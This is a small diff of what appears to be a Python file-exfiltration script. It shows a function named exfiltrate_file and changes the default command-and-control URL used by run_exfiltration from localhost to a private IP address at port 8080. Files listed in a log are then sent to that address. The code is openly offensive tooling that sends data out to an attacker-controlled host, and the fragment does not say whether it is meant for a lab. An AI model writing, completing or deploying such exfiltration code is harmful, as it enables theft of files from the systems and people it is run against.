@@ -20,7 +20,7 @@ def exfiltrate_file(file_path, url):
     except Exception as e:
         print(f"[!] Error sending {file_path}: {e}")
 
-def run_exfiltration(log_file="files.log", c2_url="http://localhost:8080"):
+def run_exfiltration(log_file="files.log", c2_url="http://172.20.10.3:8080"):
     if not os.path.exists(log_file):
         print("[-] files.log not found.")
         return
